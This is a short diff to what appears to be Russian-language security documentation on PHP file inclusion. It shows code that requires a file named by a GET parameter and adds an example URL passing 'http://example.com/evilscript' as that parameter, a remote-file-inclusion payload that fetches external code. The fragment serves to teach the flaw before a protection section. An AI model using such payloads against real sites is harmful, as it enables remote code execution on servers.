@@ -10,7 +10,8 @@ $page = $_GET['page'] ?? 'home'
 
 require $page . '.php';
 ```
-
+В приведенном примере параметр `page` может указывать на внешний скрипт, например,
+`http://yourdomain.tld/index.php?page=http://example.com/evilscript`
 
 ### Защита
 
